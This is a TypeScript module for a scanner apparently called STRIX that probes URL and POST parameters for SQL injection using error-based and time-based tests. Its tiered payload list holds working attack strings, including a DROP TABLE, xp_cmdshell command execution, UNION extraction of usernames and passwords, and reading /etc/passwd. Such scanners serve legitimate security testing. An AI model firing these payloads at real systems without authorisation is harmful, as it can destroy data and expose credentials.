// STRIX SQL Injection Scanner Module
// Basic SQLi detection through error-based and time-based techniques

import * as http from 'http';
import * as https from 'https';
import { VulnerabilityResult, ModuleInfo, ModuleResult, ProgressCallback } from '../../types';

export const moduleInfo: ModuleInfo = {
    name: 'sqli_scanner',
    displayName: 'SQL Injection Scanner',
    description: 'Detects SQL injection vulnerabilities using error-based and time-based techniques',
    author: 'STRIX',
    version: '1.0.0',
    type: 'vuln_check',
    targetService: 'http',
    options: [
        { name: 'target', type: 'string', required: true, description: 'Target URL with parameters (e.g., http://example.com/page?id=1)' },
        { name: 'method', type: 'select', required: false, default: 'GET', description: 'HTTP method', choices: ['GET', 'POST'] },
        { name: 'data', type: 'string', required: false, description: 'POST data (for POST method)' },
        { name: 'cookie', type: 'string', required: false, description: 'Cookie header value' },
        { name: 'timeout', type: 'number', required: false, default: 10000, description: 'Request timeout in ms' },
        { name: 'level', type: 'select', required: false, default: 'basic', description: 'Scan intensity', choices: ['basic', 'medium', 'aggressive'] }
    ]
};

// SQL error patterns for different databases
const SQL_ERROR_PATTERNS = {
    mysql: [
        /SQL syntax.*MySQL/i,
        /Warning.*mysql_/i,
        /MySqlException/i,
        /valid MySQL result/i,
        /check the manual that corresponds to your (MySQL|MariaDB)/i,
        /MySqlClient\./i,
        /com\.mysql\.jdbc/i,
        /Unclosed quotation mark/i,
        /SQLSTATE\[/i
    ],
    postgresql: [
        /PostgreSQL.*ERROR/i,
        /Warning.*\Wpg_/i,
        /valid PostgreSQL result/i,
        /Npgsql\./i,
        /PG::SyntaxError/i,
        /org\.postgresql\.util\.PSQLException/i,
        /ERROR:\s+syntax error at or near/i
    ],
    mssql: [
        /Driver.*SQL[\-\_\ ]*Server/i,
        /OLE DB.*SQL Server/i,
        /\bSQL Server\b.*Driver/i,
        /Warning.*mssql_/i,
        /\bSQL Server\b.*[0-9a-fA-F]{8}/i,
        /System\.Data\.SqlClient\./i,
        /Exception.*\WRoadhouse\.Cms\./i,
        /Microsoft SQL Native Client error/i,
        /ODBC SQL Server Driver/i,
        /SQLServer JDBC Driver/i,
        /com\.microsoft\.sqlserver\.jdbc/i,
        /Unclosed quotation mark after the character string/i
    ],
    oracle: [
        /\bORA-[0-9][0-9][0-9][0-9]/i,
        /Oracle error/i,
        /Oracle.*Driver/i,
        /Warning.*\Woci_/i,
        /Warning.*\Wora_/i,
        /oracle\.jdbc\.driver/i,
        /quoted string not properly terminated/i,
        /SQL command not properly ended/i
    ],
    sqlite: [
        /SQLite\/JDBCDriver/i,
        /SQLite\.Exception/i,
        /System\.Data\.SQLite\.SQLiteException/i,
        /Warning.*sqlite_/i,
        /Warning.*SQLite3::/i,
        /\[SQLITE_ERROR\]/i,
        /SQLITE_CONSTRAINT/i,
        /sqlite3\.OperationalError:/i,
        /SQLite3::SQLException/i
    ],
    generic: [
        /SQL syntax/i,
        /SQL error/i,
        /syntax error/i,
        /Unclosed quotation/i,
        /unterminated string/i,
        /quoted string/i,
        /unexpected end of SQL/i,
        /missing expression/i,
        /Invalid query/i,
        /You have an error in your SQL/i,
        /supplied argument is not a valid/i
    ]
};

// SQLi test payloads
const SQLI_PAYLOADS = {
    basic: [
        // String-based
        `'`,
        `"`,
        `' OR '1'='1`,
        `" OR "1"="1`,
        `' OR '1'='1' --`,
        `' OR '1'='1' #`,
        `' OR 1=1 --`,
        `1' OR '1'='1`,
        `1 OR 1=1`,
        `' OR 'x'='x`,
        // Numeric-based
        `1 OR 1=1`,
        `1' OR '1'='1`,
        `1 AND 1=1`,
        `1 AND 1=2`,
        // Comment injection
        `'--`,
        `'#`,
        `'/*`,
        // Error-based
        `'""`,
        `'''`,
        `'"'`,
        `1'1`,
        `1"1`
    ],
    medium: [
        // All basic plus more
        `' UNION SELECT NULL--`,
        `' UNION SELECT NULL,NULL--`,
        `' UNION SELECT NULL,NULL,NULL--`,
        `1 UNION SELECT NULL--`,
        `') OR ('1'='1`,
        `')) OR (('1'='1`,
        `' AND '1'='2' UNION SELECT 1,2,3--`,
        `1' ORDER BY 1--`,
        `1' ORDER BY 10--`,
        `1' GROUP BY 1--`,
        `1' HAVING 1=1--`,
        `' AND SUBSTRING(username,1,1)='a`,
        `' OR username LIKE '%`,
        `admin'--`,
        `admin' #`,
        `admin'/*`,
        `' OR 1=1 LIMIT 1--`,
        `1; DROP TABLE users--`,
        `1'; WAITFOR DELAY '0:0:5'--`,
        `1' AND SLEEP(5)--`,
        `1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`
    ],
    aggressive: [
        // All medium plus advanced
        `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`,
        `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--`,
        `' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
        `' AND updatexml(1,concat(0x7e,(SELECT version())),1)--`,
        `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--`,
        `';EXEC xp_cmdshell('whoami')--`,
        `'; EXEC sp_executesql N'SELECT 1'--`,
        `' UNION ALL SELECT NULL,NULL,NULL,CONCAT(username,':',password) FROM users--`,
        `1' AND pg_sleep(5)--`,
        `1' AND BENCHMARK(5000000,MD5('test'))--`,
        `1' AND (SELECT * FROM (SELECT SLEEP(5))a)--`,
        `' OR 1=1 INTO OUTFILE '/tmp/test'--`,
        `' OR 1=1 INTO DUMPFILE '/tmp/test'--`,
        `1' PROCEDURE ANALYSE()--`,
        `1' AND (SELECT load_file('/etc/passwd'))--`
    ]
};

export interface SQLiTestResult {
    payload: string;
    parameter: string;
    vulnerable: boolean;
    dbType?: string;
    errorMessage?: string;
    responseTime?: number;
    technique: 'error-based' | 'time-based' | 'boolean-based' | 'union-based';
}

export interface SQLiScanResult extends ModuleResult {
    data: {
        tests: SQLiTestResult[];
        vulnerableParams: string[];
        detectedDb?: string;
        baselineResponseTime: number;
    };
}

/**
 * Run SQL injection scan
 */
export async function run(
    target: string,
    options: {
        method?: 'GET' | 'POST';
        data?: string;
        cookie?: string;
        timeout?: number;
        level?: 'basic' | 'medium' | 'aggressive';
        onProgress?: ProgressCallback;
    } = {}
): Promise<SQLiScanResult> {
    const startTime = Date.now();
    const method = options.method || 'GET';
    const timeout = options.timeout || 10000;
    const level = options.level || 'basic';

    const result: SQLiScanResult = {
        success: false,
        module: 'sqli_scanner',
        target,
        data: {
            tests: [],
            vulnerableParams: [],
            baselineResponseTime: 0
        },
        vulnerabilities: [],
        duration: 0
    };

    try {
        const url = new URL(target);
        const useSSL = url.protocol === 'https:';

        // Get parameters to test
        const params: Map<string, string> = new Map();

        // Parse URL parameters
        url.searchParams.forEach((value, key) => {
            params.set(key, value);
        });

        // Parse POST data if provided
        if (options.data) {
            const postParams = new URLSearchParams(options.data);
            postParams.forEach((value, key) => {
                params.set(key, value);
            });
        }

        if (params.size === 0) {
            result.error = 'No parameters found to test';
            result.duration = Date.now() - startTime;
            return result;
        }

        // Get baseline response time
        const baselineStart = Date.now();
        await makeRequest(url, method, useSSL, timeout, options.cookie);
        result.data.baselineResponseTime = Date.now() - baselineStart;

        // Get payloads based on level
        let payloads = [...SQLI_PAYLOADS.basic];
        if (level === 'medium' || level === 'aggressive') {
            payloads = [...payloads, ...SQLI_PAYLOADS.medium];
        }
        if (level === 'aggressive') {
            payloads = [...payloads, ...SQLI_PAYLOADS.aggressive];
        }

        const totalTests = params.size * payloads.length;
        let completedTests = 0;
        const vulnerableParams = new Set<string>();
        let detectedDb: string | undefined;

        // Test each parameter
        for (const [paramName, originalValue] of params) {
            for (const payload of payloads) {
                // Build test URL/data
                const testUrl = new URL(target);
                let testData = options.data;

                if (method === 'GET' || testUrl.searchParams.has(paramName)) {
                    testUrl.searchParams.set(paramName, originalValue + payload);
                } else if (testData) {
                    const postParams = new URLSearchParams(testData);
                    postParams.set(paramName, originalValue + payload);
                    testData = postParams.toString();
                }

                // Make request and analyze
                const requestStart = Date.now();
                const response = await makeRequest(
                    testUrl,
                    method,
                    useSSL,
                    timeout,
                    options.cookie,
                    testData
                );
                const responseTime = Date.now() - requestStart;

                const testResult: SQLiTestResult = {
                    payload,
                    parameter: paramName,
                    vulnerable: false,
                    responseTime,
                    technique: 'error-based'
                };

                if (response) {
                    // Check for SQL errors in response
                    const errorCheck = checkForSQLErrors(response);
                    if (errorCheck.found) {
                        testResult.vulnerable = true;
                        testResult.dbType = errorCheck.dbType;
                        testResult.errorMessage = errorCheck.message;
                        testResult.technique = 'error-based';
                        vulnerableParams.add(paramName);
                        if (errorCheck.dbType) {
                            detectedDb = errorCheck.dbType;
                        }
                    }

                    // Check for time-based (if payload contains delay)
                    if (payload.includes('SLEEP') || payload.includes('WAITFOR') || payload.includes('pg_sleep')) {
                        if (responseTime > result.data.baselineResponseTime + 4000) {
                            testResult.vulnerable = true;
                            testResult.technique = 'time-based';
                            vulnerableParams.add(paramName);
                        }
                    }
                }

                result.data.tests.push(testResult);
                completedTests++;

                if (options.onProgress) {
                    options.onProgress({
                        phase: 'sqli_scan',
                        current: completedTests,
                        total: totalTests,
                        message: `Testing ${paramName}: ${completedTests}/${totalTests}`
                    });
                }

                // If we found vulnerability with this payload, skip to next parameter
                if (testResult.vulnerable) {
                    break;
                }
            }
        }

        result.data.vulnerableParams = Array.from(vulnerableParams);
        result.data.detectedDb = detectedDb;
        result.success = true;

        // Generate vulnerability reports
        for (const param of vulnerableParams) {
            const vulnTests = result.data.tests.filter(t => t.parameter === param && t.vulnerable);
            const techniques = [...new Set(vulnTests.map(t => t.technique))];

            result.vulnerabilities!.push({
                id: 'SQLI-001',
                name: 'SQL Injection Vulnerability',
                severity: 'critical',
                description: `SQL injection found in parameter "${param}" using ${techniques.join(', ')} technique(s)`,
                evidence: `Payload: ${vulnTests[0]?.payload}${vulnTests[0]?.errorMessage ? '\nError: ' + vulnTests[0].errorMessage : ''}`,
                remediation: 'Use parameterized queries/prepared statements. Implement input validation and escape special characters.',
                cve: 'CWE-89',
                host: target,
                service: 'http'
            });
        }

    } catch (err: any) {
        result.error = err.message;
    }

    result.duration = Date.now() - startTime;
    return result;
}

/**
 * Make HTTP request
 */
async function makeRequest(
    url: URL,
    method: string,
    ssl: boolean,
    timeout: number,
    cookie?: string,
    postData?: string
): Promise<string | null> {
    return new Promise((resolve) => {
        const options: http.RequestOptions = {
            hostname: url.hostname,
            port: url.port || (ssl ? 443 : 80),
            path: url.pathname + url.search,
            method,
            timeout,
            rejectUnauthorized: false,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'close'
            }
        };

        if (cookie) {
            options.headers!['Cookie'] = cookie;
        }

        if (postData) {
            options.headers!['Content-Type'] = 'application/x-www-form-urlencoded';
            options.headers!['Content-Length'] = Buffer.byteLength(postData);
        }

        const protocol = ssl ? https : http;

        const req = protocol.request(options, (res) => {
            let body = '';

            res.on('data', (chunk) => {
                body += chunk;
                if (body.length > 100000) {
                    res.destroy();
                }
            });

            res.on('end', () => {
                resolve(body);
            });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve(null);
        });

        req.on('error', () => {
            resolve(null);
        });

        if (postData) {
            req.write(postData);
        }

        req.end();
    });
}

/**
 * Check response for SQL error messages
 */
function checkForSQLErrors(response: string): { found: boolean; dbType?: string; message?: string } {
    for (const [dbType, patterns] of Object.entries(SQL_ERROR_PATTERNS)) {
        for (const pattern of patterns) {
            const match = response.match(pattern);
            if (match) {
                return {
                    found: true,
                    dbType: dbType === 'generic' ? undefined : dbType,
                    message: match[0].substring(0, 200)
                };
            }
        }
    }

    return { found: false };
}

/**
 * Quick SQLi test for a single parameter
 */
export async function quickTest(
    target: string,
    parameter: string,
    options: { method?: 'GET' | 'POST'; timeout?: number } = {}
): Promise<boolean> {
    const quickPayloads = [`'`, `"`, `' OR '1'='1`, `1' OR '1'='1`];

    for (const payload of quickPayloads) {
        const url = new URL(target);
        url.searchParams.set(parameter, url.searchParams.get(parameter) + payload);

        const response = await makeRequest(
            url,
            options.method || 'GET',
            url.protocol === 'https:',
            options.timeout || 5000
        );

        if (response && checkForSQLErrors(response).found) {
            return true;
        }
    }

    return false;
}

export default { run, moduleInfo, quickTest, SQL_ERROR_PATTERNS, SQLI_PAYLOADS };
